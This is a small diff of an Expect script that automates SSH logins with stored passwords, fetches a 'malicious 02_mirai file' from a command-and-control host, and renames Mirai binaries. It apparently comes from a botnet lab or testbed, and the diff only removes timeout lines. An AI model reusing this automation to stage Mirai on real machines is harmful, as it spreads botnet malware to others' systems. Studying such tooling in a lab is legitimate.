@@ -24,7 +24,6 @@ expect "*continue connecting (yes/no*)? "
 send "yes\r"
 expect " password: "
 send "$password\r"
-set timeout 60
 
 # download malicious 02_mirai file from cnc
 expect "*:~# "
@@ -35,8 +34,6 @@ expect "*continue connecting (yes/no*)? "
 send "yes\r"
 expect " password: "
 send "$cnc_pass\r"
-set timeout 60
-
 # change 02_mirai name
 expect "*:~# "
 send "mv $path/$mirai_scan.dbg $path/$mirai.dbg\r"
